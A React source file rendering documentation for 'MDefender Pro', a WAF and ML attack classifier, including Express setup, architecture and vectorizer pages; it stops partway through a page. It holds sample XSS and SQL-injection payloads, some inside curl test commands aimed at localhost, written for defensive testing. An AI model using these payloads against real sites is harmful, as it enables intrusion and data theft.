import { useState, useMemo } from 'react'
import { Link } from 'react-router-dom'
import { useTheme } from '../contexts/ThemeContext'
import PublicNavbar from '../components/PublicNavbar'
import copyToClipboard from '../utils/clipboard'

const docSections = [
  {
    group: 'Getting Started',
    items: [
      { id: 'intro', label: 'What is MDefender Pro', icon: 'fa-shield-halved' },
      { id: 'hybrid-architecture', label: 'Hybrid WAF + ML Engine', icon: 'fa-network-wired' },
      { id: 'quickstart', label: '5-Minute Quickstart', icon: 'fa-bolt' },
      { id: 'website-connect', label: 'Connect Website Guide', icon: 'fa-plug-circle-bolt' }
    ]
  },
  {
    group: '5.2M+ Dataset ML Core',
    items: [
      { id: 'ml-overview', label: 'Machine Learning Model', icon: 'fa-microchip' },
      { id: 'ml-vectorizer', label: 'Character N-Gram Vectorizer', icon: 'fa-cubes-stacked' },
      { id: 'ml-classification', label: 'Risk Scoring & Categories', icon: 'fa-gauge-high' }
    ]
  },
  {
    group: '2,000 WAF Rules Catalog',
    items: [
      { id: 'rules-overview', label: 'Signatures Overview', icon: 'fa-list-check' },
      { id: 'sqli-defense', label: 'SQL Injection (350 Rules)', icon: 'fa-database' },
      { id: 'xss-defense', label: 'Cross-Site Scripting (350 Rules)', icon: 'fa-code' },
      { id: 'rce-webshells', label: 'RCE & WebShells (350 Rules)', icon: 'fa-terminal' },
      { id: 'lfi-traversal', label: 'LFI & Traversal (250 Rules)', icon: 'fa-folder-open' },
      { id: 'cms-vulnerabilities', label: 'CMS Exploits (300 Rules)', icon: 'fa-file-shield' },
      { id: 'bots-scanners', label: 'Bots & Scanners (200 Rules)', icon: 'fa-robot' },
      { id: 'ssrf-xxe', label: 'SSRF & XXE (200 Rules)', icon: 'fa-cloud' }
    ]
  },
  {
    group: 'Framework SDK Guides',
    items: [
      { id: 'sdk-nodejs', label: 'Node.js / Express (Backend)', icon: 'fa-node-js' },
      { id: 'sdk-react-vite', label: 'React / Vite / SPA (Frontend)', icon: 'fa-react' },
      { id: 'sdk-fullstack', label: 'Full-Stack Web App (End-to-End)', icon: 'fa-layer-group' },
      { id: 'sdk-python', label: 'Python / FastAPI / Django', icon: 'fa-python' },
      { id: 'sdk-php', label: 'PHP / Laravel', icon: 'fa-php' },
      { id: 'sdk-wordpress', label: 'WordPress Official Plugin', icon: 'fa-wordpress' }
    ]
  },
  {
    group: 'Custom Rules Builder',
    items: [
      { id: 'custom-rules-guide', label: 'Authoring Regex Policies', icon: 'fa-sliders' },
      { id: 'tenant-isolation', label: 'Tenant Isolation & Policy Actions', icon: 'fa-lock' }
    ]
  },
  {
    group: 'REST API Reference',
    items: [
      { id: 'api-auth', label: 'Authentication Endpoints', icon: 'fa-key' },
      { id: 'api-rules', label: 'Custom Rules CRUD API', icon: 'fa-gears' },
      { id: 'api-telemetry', label: 'Logs & Metrics Streams', icon: 'fa-chart-line' }
    ]
  },
  {
    group: 'Operations & Compliance',
    items: [
      { id: 'learning-lab', label: 'Attack Learning Lab & Retraining', icon: 'fa-brain' },
      { id: 'benchmarks', label: 'Latency & Benchmarks', icon: 'fa-stopwatch' },
      { id: 'compliance', label: 'SOC 2 & GDPR Privacy', icon: 'fa-certificate' },
      { id: 'faqs', label: 'Frequently Asked Questions', icon: 'fa-circle-question' }
    ]
  }
]

function CodeBlock({ code, language = 'javascript' }) {
  const [copied, setCopied] = useState(false)
  const handleCopy = async () => {
    const ok = await copyToClipboard(code)
    if (ok) {
      setCopied(true)
      setTimeout(() => setCopied(false), 2000)
    }
  }

  return (
    <div style={{
      borderRadius: '10px',
      overflow: 'hidden',
      margin: '18px 0',
      background: '#070b14',
      border: '1px solid #1e293b'
    }}>
      <div style={{
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        padding: '8px 16px',
        background: '#04070e',
        borderBottom: '1px solid #1e293b',
        fontSize: '11px',
        color: '#64748b',
        fontFamily: 'monospace'
      }}>
        <span>{language.toUpperCase()}</span>
        <button
          onClick={handleCopy}
          style={{
            background: 'none',
            border: 'none',
            color: copied ? '#10b981' : '#94a3b8',
            cursor: 'pointer',
            fontSize: '11px',
            display: 'flex',
            alignItems: 'center',
            gap: '4px'
          }}
        >
          <i className={`fas ${copied ? 'fa-check' : 'fa-copy'}`}></i>
          {copied ? 'Copied' : 'Copy'}
        </button>
      </div>
      <pre style={{
        margin: 0,
        padding: '18px 20px',
        color: '#e2e8f0',
        fontSize: '13px',
        lineHeight: '1.65',
        fontFamily: "'SF Mono', Monaco, 'Cascadia Code', monospace",
        overflowX: 'auto'
      }}>
        <code>{code}</code>
      </pre>
    </div>
  )
}

function MethodBadge({ method }) {
  const colors = {
    GET: { bg: 'rgba(37,99,235,0.15)', color: '#60a5fa', border: '#2563eb' },
    POST: { bg: 'rgba(16,185,129,0.15)', color: '#34d399', border: '#059669' },
    PUT: { bg: 'rgba(245,158,11,0.15)', color: '#fbbf24', border: '#d97706' },
    DELETE: { bg: 'rgba(239,68,68,0.15)', color: '#f87171', border: '#dc2626' }
  }
  const c = colors[method] || colors.GET
  return (
    <span style={{
      display: 'inline-block',
      padding: '2px 8px',
      borderRadius: '4px',
      fontSize: '11px',
      fontWeight: '800',
      fontFamily: 'monospace',
      backgroundColor: c.bg,
      color: c.color,
      border: `1px solid ${c.border}`,
      marginRight: '8px'
    }}>
      {method}
    </span>
  )
}

export default function Docs() {
  const [activeSection, setActiveSection] = useState('intro')
  const [searchFilter, setSearchFilter] = useState('')

  const filteredDocSections = useMemo(() => {
    if (!searchFilter.trim()) return docSections
    const q = searchFilter.toLowerCase()
    return docSections
      .map(group => ({
        ...group,
        items: group.items.filter(item => item.label.toLowerCase().includes(q))
      }))
      .filter(group => group.items.length > 0)
  }, [searchFilter])

  return (
    <div style={{
      minHeight: '100vh',
      background: '#070b14',
      color: '#f1f5f9',
      fontFamily: "'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif"
    }}>
      <PublicNavbar />

      <div style={{
        maxWidth: '1440px',
        margin: '0 auto',
        display: 'flex',
        minHeight: 'calc(100vh - 70px)'
      }}>
        {/* Left Navigation Sidebar */}
        <aside style={{
          width: '310px',
          flexShrink: 0,
          borderRight: '1px solid #1e293b',
          background: '#0a0e1a',
          padding: '28px 20px',
          position: 'sticky',
          top: '70px',
          height: 'calc(100vh - 70px)',
          overflowY: 'auto'
        }}>
          {/* Search Box */}
          <div style={{ position: 'relative', marginBottom: '24px' }}>
            <i className="fas fa-search" style={{
              position: 'absolute',
              left: '12px',
              top: '50%',
              transform: 'translateY(-50%)',
              color: '#64748b',
              fontSize: '12px'
            }}></i>
            <input
              type="text"
              placeholder="Search documentation..."
              value={searchFilter}
              onChange={e => setSearchFilter(e.target.value)}
              style={{
                width: '100%',
                padding: '8px 12px 8px 34px',
                borderRadius: '8px',
                border: '1px solid #1e293b',
                background: '#070b14',
                color: '#e2e8f0',
                fontSize: '13px',
                outline: 'none'
              }}
            />
          </div>

          {/* Nav Group List */}
          <div style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}>
            {filteredDocSections.map((group, idx) => (
              <div key={idx}>
                <div style={{
                  fontSize: '11px',
                  fontWeight: '700',
                  color: '#64748b',
                  textTransform: 'uppercase',
                  letterSpacing: '0.05em',
                  marginBottom: '8px',
                  paddingLeft: '8px'
                }}>
                  {group.group}
                </div>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '2px' }}>
                  {group.items.map(item => (
                    <button
                      key={item.id}
                      onClick={() => setActiveSection(item.id)}
                      style={{
                        padding: '7px 10px',
                        borderRadius: '6px',
                        border: 'none',
                        background: activeSection === item.id ? 'rgba(37,99,235,0.15)' : 'transparent',
                        color: activeSection === item.id ? '#60a5fa' : '#94a3b8',
                        fontWeight: activeSection === item.id ? '700' : '500',
                        fontSize: '13px',
                        cursor: 'pointer',
                        textAlign: 'left',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '8px',
                        transition: 'all 0.15s'
                      }}
                    >
                      <i className={`fas ${item.icon}`} style={{ width: '16px', textAlign: 'center', color: activeSection === item.id ? '#38bdf8' : '#64748b' }}></i>
                      {item.label}
                    </button>
                  ))}
                </div>
              </div>
            ))}
          </div>
        </aside>

        {/* Right Content Pane */}
        <main style={{
          flex: 1,
          padding: '40px 48px 100px',
          maxWidth: '1020px',
          overflowY: 'auto'
        }}>
          {/* Breadcrumb Header */}
          <div style={{ fontSize: '13px', color: '#64748b', marginBottom: '14px', display: 'flex', alignItems: 'center', gap: '6px' }}>
            <span>Docs</span>
            <i className="fas fa-chevron-right" style={{ fontSize: '10px' }}></i>
            <span style={{ color: '#38bdf8', fontWeight: '600' }}>
              {docSections.flatMap(g => g.items).find(i => i.id === activeSection)?.label || 'Overview'}
            </span>
          </div>

          {/* Section: Intro */}
          {activeSection === 'intro' && (
            <div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>What is MDefender Pro?</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                <strong>MDefender Pro</strong> is an enterprise-grade, hybrid Web Application Firewall (WAF) and real-time API protection suite. It combines a deterministic catalog of <strong>2,000 verified WAF signature rules</strong> with a state-of-the-art <strong>Machine Learning model trained on 5.2M+ real-world attack vectors</strong> to safeguard applications against OWASP Top 10 vulnerabilities, zero-day payloads, and bot scrapers with sub-millisecond execution.
              </p>

              <div style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(auto-fit, minmax(260px, 1fr))',
                gap: '16px',
                margin: '28px 0'
              }}>
                <div style={{ padding: '22px', borderRadius: '10px', background: '#0c1222', border: '1px solid #1e293b' }}>
                  <div style={{ color: '#38bdf8', fontWeight: '700', fontSize: '15px', marginBottom: '6px' }}>
                    <i className="fas fa-microchip" style={{ marginRight: '6px' }}></i> 5.2M+ Dataset ML Model
                  </div>
                  <p style={{ fontSize: '13px', color: '#94a3b8', margin: 0, lineHeight: '1.6' }}>
                    Trained across CSIC HTTP, CICIDS, and honeypot corpora using character n-gram TF-IDF vectorization.
                  </p>
                </div>

                <div style={{ padding: '22px', borderRadius: '10px', background: '#0c1222', border: '1px solid #1e293b' }}>
                  <div style={{ color: '#60a5fa', fontWeight: '700', fontSize: '15px', marginBottom: '6px' }}>
                    <i className="fas fa-shield-halved" style={{ marginRight: '6px' }}></i> 2,000 WAF Rules
                  </div>
                  <p style={{ fontSize: '13px', color: '#94a3b8', margin: 0, lineHeight: '1.6' }}>
                    Exhaustive regex catalog covering SQLi, XSS, RCE, LFI, CMS exploits, and scanner bots.
                  </p>
                </div>

                <div style={{ padding: '22px', borderRadius: '10px', background: '#0c1222', border: '1px solid #1e293b' }}>
                  <div style={{ color: '#10b981', fontWeight: '700', fontSize: '15px', marginBottom: '6px' }}>
                    <i className="fas fa-bolt" style={{ marginRight: '6px' }}></i> &lt; 0.85ms Latency
                  </div>
                  <p style={{ fontSize: '13px', color: '#94a3b8', margin: 0, lineHeight: '1.6' }}>
                    Pre-compiled in-memory lookup table and low-overhead SGD inference guarantee zero application lag.
                  </p>
                </div>
              </div>
            </div>
          )}

          {/* Section: Hybrid Architecture */}
          {activeSection === 'hybrid-architecture' && (
            <div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Hybrid WAF + ML Architecture</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '20px' }}>
                MDefender employs a multi-tiered pipeline that executes deterministic rule checks alongside statistical machine learning classification:
              </p>

              <div style={{
                background: '#0a0e1a',
                border: '1px solid #1e293b',
                borderRadius: '12px',
                padding: '28px',
                margin: '24px 0'
              }}>
                <div style={{ display: 'flex', flexDirection: 'column', gap: '18px' }}>
                  <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(37,99,235,0.2)', color: '#60a5fa', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>1</span>
                    <div>
                      <strong style={{ fontSize: '15px', color: '#ffffff' }}>Request Extraction &amp; Recursive Normalization</strong>
                      <p style={{ fontSize: '13px', color: '#94a3b8', marginTop: '4px', lineHeight: '1.6' }}>
                        Extracts URL path, query string, request headers (User-Agent, Referer, Cookies), and multipart/JSON body fields. Executes double URL unquoting to prevent multi-layered encoding evasion.
                      </p>
                    </div>
                  </div>

                  <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(37,99,235,0.2)', color: '#60a5fa', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>2</span>
                    <div>
                      <strong style={{ fontSize: '15px', color: '#ffffff' }}>Tier 1: 2,000 Compiled Regex Rules (0.12ms)</strong>
                      <p style={{ fontSize: '13px', color: '#94a3b8', marginTop: '4px', lineHeight: '1.6' }}>
                        Evaluates pre-compiled regular expressions for known signatures. Also appends custom user-defined tenant rules dynamically.
                      </p>
                    </div>
                  </div>

                  <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(139,92,246,0.2)', color: '#c084fc', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>3</span>
                    <div>
                      <strong style={{ fontSize: '15px', color: '#ffffff' }}>Tier 2: 5.2M Dataset ML Inference Classifier (0.34ms)</strong>
                      <p style={{ fontSize: '13px', color: '#94a3b8', marginTop: '4px', lineHeight: '1.6' }}>
                        Vectorizes text into character n-grams and evaluates against the trained linear SGD / logistic model, outputting probability confidence and attack category.
                      </p>
                    </div>
                  </div>

                  <div style={{ display: 'flex', gap: '16px', alignItems: 'flex-start' }}>
                    <span style={{ width: '30px', height: '30px', borderRadius: '50%', background: 'rgba(16,185,129,0.2)', color: '#34d399', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: '800', fontSize: '13px', flexShrink: 0 }}>4</span>
                    <div>
                      <strong style={{ fontSize: '15px', color: '#ffffff' }}>Decision Engine &amp; Threat Termination</strong>
                      <p style={{ fontSize: '13px', color: '#94a3b8', marginTop: '4px', lineHeight: '1.6' }}>
                        If confidence exceeds threshold or a rule is matched, the engine returns an immediate <code>HTTP 403 Forbidden</code>, flags the attacking IP, and streams live telemetry to the user dashboard.
                      </p>
                    </div>
                  </div>
                </div>
              </div>
            </div>
          )}

          {/* Section: Website Connect & 5-Minute Quickstart */}
          {(activeSection === 'website-connect' || activeSection === 'quickstart') && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(56, 189, 248, 0.15)',
                  border: '1px solid rgba(56, 189, 248, 0.3)',
                  color: '#38bdf8',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Integration Guide</span>
                <span style={{
                  padding: '4px 12px',
                  borderRadius: '20px',
                  background: 'rgba(16, 185, 129, 0.15)',
                  border: '1px solid rgba(16, 185, 129, 0.3)',
                  color: '#34d399',
                  fontSize: '12px',
                  fontWeight: '700'
                }}>Zero Config &bull; Bundled 403 Page</span>
              </div>

              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>
                How to Connect Your Website with MDefender
              </h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '28px' }}>
                Learn how to integrate MDefender Pro into any web application or backend. When you install our package, everything &mdash; including the high-speed 403 Cyber Block Page &mdash; is bundled and ready to go immediately upon adding your API key.
              </p>

              {/* Step 1: Install Package */}
              <div style={{
                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
                border: '1px solid #334155',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '24px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '12px' }}>
                  <i className="fa-solid fa-1" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
                  Install the NPM Package
                </h3>
                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
                  Run the following command in your backend project directory:
                </p>
                <CodeBlock language="bash" code={`npm install mdefender-pro`} />
                <div style={{
                  background: 'rgba(56, 189, 248, 0.08)',
                  border: '1px solid rgba(56, 189, 248, 0.25)',
                  borderRadius: '10px',
                  padding: '14px 16px',
                  marginTop: '14px'
                }}>
                  <p style={{ margin: 0, fontSize: '12.5px', color: '#93c5fd', lineHeight: '1.6' }}>
                    <i className="fa-solid fa-shield-halved" style={{ marginRight: '6px', color: '#38bdf8' }}></i>
                    <strong>Bundled Block Page:</strong> The MDefender-Pro AI Corporate 403 Block Page is automatically installed inside <code>mdefender-pro</code> with real-time GeoIP, country flags, and incident tracking. You do <strong>NOT</strong> need to create or host an external HTML file!
                  </p>
                </div>
              </div>

              {/* Step 2: Get API Key */}
              <div style={{
                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
                border: '1px solid #334155',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '24px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '12px' }}>
                  <i className="fa-solid fa-2" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
                  Get Your Website API Key
                </h3>
                <p style={{ fontSize: '13px', color: '#94a3b8', lineHeight: '1.6', margin: '0 0 12px' }}>
                  Go to <Link to="/user/settings" style={{ color: '#38bdf8', fontWeight: '600' }}>Settings</Link> or <Link to="/user/websites" style={{ color: '#38bdf8', fontWeight: '600' }}>Websites</Link> in your MDefender dashboard to copy your active API Key (e.g. <code>Ix2TtXbbBHJol...</code>).
                </p>
              </div>

              {/* Step 3: Configure Your Application */}
              <div style={{
                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
                border: '1px solid #334155',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '24px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '12px' }}>
                  <i className="fa-solid fa-3" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
                  Configure Your Application
                </h3>
                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
                  You can configure MDefender in either of two easy ways:
                </p>

                <div style={{ marginTop: '14px' }}>
                  <div style={{ fontSize: '13px', fontWeight: '700', color: '#38bdf8', marginBottom: '6px' }}>
                    Option A: Config File (<code>mdefender.config.js</code>)
                  </div>
                  <CodeBlock
                    language="javascript"
                    code={`// mdefender.config.js (in your project root)
module.exports = {
  apiKey: "YOUR_API_KEY_HERE",
  domain: "yourdomain.com",
  apiEndpoint: "http://217.15.170.82",
  mode: "block",
  logBlocked: true
};`}
                  />
                </div>

                <div style={{ marginTop: '18px' }}>
                  <div style={{ fontSize: '13px', fontWeight: '700', color: '#38bdf8', marginBottom: '6px' }}>
                    Option B: Pass Directly in Code
                  </div>
                  <CodeBlock
                    language="javascript"
                    code={`// Attach in your Express server index.js
const mdefender = require('mdefender-pro');

app.use(mdefender({
  apiKey: 'YOUR_API_KEY_HERE',
  domain: 'yourdomain.com',
  apiEndpoint: 'http://217.15.170.82'
}));`}
                  />
                </div>
              </div>

              {/* Step 4: Attach Middleware in Express */}
              <div style={{
                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
                border: '1px solid #334155',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '24px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '12px' }}>
                  <i className="fa-solid fa-4" style={{ color: '#38bdf8', marginRight: '10px' }}></i>
                  Attach Middleware in Express
                </h3>
                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
                  Make sure <code>{"app.use(mdefender())"}</code> is placed after body parsers and before route endpoints:
                </p>
                <CodeBlock
                  language="javascript"
                  code={`const express = require('express');
const cors = require('cors');
const mdefender = require('mdefender-pro');

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// WAF Middleware - Inspects all requests in real-time
app.use(mdefender());

// Your Application Routes
app.use('/api/books', bookRoutes);
app.use('/api/orders', orderRoutes);

app.listen(5000, () => console.log('Bookstore Server running with MDefender Pro!'));`}
                />
              </div>

              {/* Understanding Frontend vs Backend in Network Tab */}
              <div style={{
                background: '#0a0e1a',
                border: '1px solid #1e293b',
                borderRadius: '16px',
                padding: '24px',
                marginBottom: '24px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '14px' }}>
                  <i className="fa-solid fa-network-wired" style={{ color: '#a78bfa', marginRight: '8px' }}></i>
                  Understanding Frontend vs Backend in Network Tab
                </h3>
                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '16px', lineHeight: '1.6' }}>
                  When building a modern full-stack web app (e.g. React/Vite on port 5173/5174 and Express on port 4000/5000):
                </p>

                <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px' }}>
                  <div style={{ background: '#0f172a', padding: '16px', borderRadius: '10px', border: '1px solid #334155' }}>
                    <h4 style={{ color: '#10b981', margin: '0 0 8px', fontSize: '14px', fontWeight: '700' }}>
                      <i className="fa-solid fa-server" style={{ marginRight: '6px' }}></i>
                      Backend API Requests (Port 4000 / 5000)
                    </h4>
                    <p style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
                      When a malicious request is sent to your API (e.g. <code>http://localhost:5000/api/books?id=&lt;script&gt;alert(1)&lt;/script&gt;</code>), the WAF intercepts it, stops execution, returns <strong>403 Forbidden</strong>, and renders the 403 Cyber Block Page.
                    </p>
                  </div>

                  <div style={{ background: '#0f172a', padding: '16px', borderRadius: '10px', border: '1px solid #334155' }}>
                    <h4 style={{ color: '#38bdf8', margin: '0 0 8px', fontSize: '14px', fontWeight: '700' }}>
                      <i className="fab fa-react" style={{ marginRight: '6px' }}></i>
                      Frontend Dev Server (Port 5173 / 5174)
                    </h4>
                    <p style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
                      Visiting the static URL loads the client Single-Page Application bundle from Vite. With <code>initWaf</code> in <code>main.jsx</code> and <code>mdefenderVite</code> in <code>vite.config.js</code>, hostile exploits in URL queries or client state are blocked instantly with the bundled 403 Block Page.
                    </p>
                  </div>
                </div>
              </div>

              {/* Test and Verify Active Protection */}
              <div style={{
                background: 'linear-gradient(135deg, rgba(30, 41, 59, 0.7), rgba(15, 23, 42, 0.8))',
                border: '1px solid #334155',
                borderRadius: '16px',
                padding: '24px'
              }}>
                <h3 style={{ fontSize: '18px', fontWeight: '800', color: '#f8fafc', marginBottom: '12px' }}>
                  <i className="fa-solid fa-flask" style={{ color: '#10b981', marginRight: '10px' }}></i>
                  Test and Verify Active Protection
                </h3>
                <p style={{ fontSize: '13px', color: '#94a3b8', marginBottom: '12px' }}>
                  Execute these test requests in your terminal or browser:
                </p>
                <CodeBlock
                  language="bash"
                  code={`# 1. Test XSS Attack (Expect 403 Forbidden & Cyber Block Page)
curl -i "http://localhost:5000/api/books?id=%3Cscript%3Ealert(1)%3C/script%3E"

# 2. Test SQL Injection (Expect 403 Forbidden & Cyber Block Page)
curl -i "http://localhost:5000/api/books?search=%27%20UNION%20SELECT%20null,password%20FROM%20users--"

# 3. Test Safe Query (Expect 200 OK with data)
curl -i "http://localhost:5000/api/books"`}
                />
              </div>
            </div>
          )}

          {/* Section: ML Overview */}
          {activeSection === 'ml-overview' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: '#38bdf8', fontSize: '12px', fontWeight: '700' }}>AI Core</span>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#34d399', fontSize: '12px', fontWeight: '700' }}>5,200,000+ Training Samples</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>The 5.2M+ Dataset Machine Learning Core</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                MDefender Pro's Machine Learning core is engineered to stop polymorphic payloads, zero-day CVE exploits, and obfuscations that evade traditional static signatures.
              </p>

              <div style={{
                background: '#0c1222',
                border: '1px solid #1e293b',
                borderRadius: '12px',
                padding: '24px',
                margin: '24px 0'
              }}>
                <h3 style={{ fontSize: '17px', fontWeight: '700', marginBottom: '12px', color: '#38bdf8' }}>Training Corpus &amp; Dataset Highlights:</h3>
                <ul style={{ paddingLeft: '20px', fontSize: '13px', lineHeight: '1.8', color: '#94a3b8' }}>
                  <li><strong>5,200,000+ Sample Corpus:</strong> Combines HTTP traffic corpora from CSIC 2010, CICIDS2017, OWASP ModSecurity Core Rule Set vectors, and real-world honeypot captures.</li>
                  <li><strong>Character N-Gram Vectorizer:</strong> Analyzes 3-gram to 5-gram token distributions to capture structural syntactic patterns rather than relying on exact keyword substrings.</li>
                  <li><strong>Dual Classifier Output:</strong> Generates a binary attack probability (0.0 to 1.0) and a multi-class threat classifier (SQLi, XSS, RCE, LFI, SSRF, Deserialization).</li>
                  <li><strong>Inference Speed:</strong> Optimized via scikit-learn SGDClassifier / joblib serialization to execute inference in less than 0.35ms.</li>
                </ul>
              </div>

              <h3 style={{ fontSize: '18px', fontWeight: '700', marginTop: '30px', marginBottom: '12px' }}>ML Detector Python API</h3>
              <CodeBlock
                language="python"
                code={`from src.engine.ml_detector import MLDetector

detector = MLDetector()

# Analyze an incoming request payload
result = detector.detect("UNION SELECT password FROM users --")
print(result)

# Output:
# {
#   "attack": True,
#   "prediction": 1,
#   "probability": 0.9984,
#   "category": "SQL Injection",
#   "confidence": 0.9984,
#   "risk_score": 100,
#   "threshold": 0.70
# }`}
              />
            </div>
          )}

          {/* Section: ML Vectorizer */}
          {activeSection === 'ml-vectorizer' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(168, 85, 247, 0.15)', border: '1px solid rgba(168, 85, 247, 0.3)', color: '#c084fc', fontSize: '12px', fontWeight: '700' }}>Feature Extraction</span>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(56, 189, 248, 0.15)', border: '1px solid rgba(56, 189, 248, 0.3)', color: '#38bdf8', fontSize: '12px', fontWeight: '700' }}>Character 3-to-5 N-Grams</span>
              </div>
              <h1 style={{ fontSize: '34px', fontWeight: '900', marginBottom: '16px', color: '#ffffff' }}>Character N-Gram Vectorization</h1>
              <p style={{ fontSize: '15px', lineHeight: '1.7', color: '#cbd5e1', marginBottom: '24px' }}>
                Traditional word-level tokenizers fail when attackers use comment evasion (e.g. <code>UN/**/ION SEL/**/ECT</code>) or variable renaming. MDefender uses sub-character n-gram decomposition to capture structural anomalies.
              </p>

              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: '16px', marginBottom: '24px' }}>
                <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px' }}>
                  <h4 style={{ color: '#38bdf8', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                    <i className="fa-solid fa-scissors" style={{ marginRight: '6px' }}></i> Sub-Word Slicing
                  </h4>
                  <p style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
                    Extracts overlapping character windows of length 3, 4, and 5. A snippet like <code>&lt;scr</code> breaks into <code>['&lt;sc', 'scr', 'crip', 'ript']</code>.
                  </p>
                </div>
                <div style={{ background: '#0c1222', border: '1px solid #1e293b', borderRadius: '12px', padding: '20px' }}>
                  <h4 style={{ color: '#34d399', margin: '0 0 8px', fontSize: '15px', fontWeight: '700' }}>
                    <i className="fa-solid fa-weight-scale" style={{ marginRight: '6px' }}></i> TF-IDF Weighting
                  </h4>
                  <p style={{ fontSize: '12.5px', color: '#94a3b8', lineHeight: '1.6', margin: 0 }}>
                    Scales down harmless common English/URL n-grams while amplifying rare syntactic attack tokens with high discriminative entropy.
                  </p>
                </div>
              </div>

              <CodeBlock
                language="python"
                code={`# Vectorizer pipeline configuration
from sklearn.feature_extraction.text import TfidfVectorizer

vectorizer = TfidfVectorizer(
    analyzer='char',
    ngram_range=(3, 5),
    max_features=50000,
    sublinear_tf=True
)

# Transforms raw payload string into sparse feature matrix in 0.08ms`}
              />
            </div>
          )}

          {/* Section: ML Classification & Risk Scoring */}
          {activeSection === 'ml-classification' && (
            <div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '12px', marginBottom: '16px' }}>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(239, 68, 68, 0.15)', border: '1px solid rgba(239, 68, 68, 0.3)', color: '#f87171', fontSize: '12px', fontWeight: '700' }}>Scoring Engine</span>
                <span style={{ padding: '4px 12px', borderRadius: '20px', background: 'rgba(16, 185, 129, 0.15)', border: '1px solid rgba(16, 185, 129, 0.3)', color: '#34d399', fontSize: '12px', fontWeight: '700' }}>0-100 Risk Index</span>
              </div>
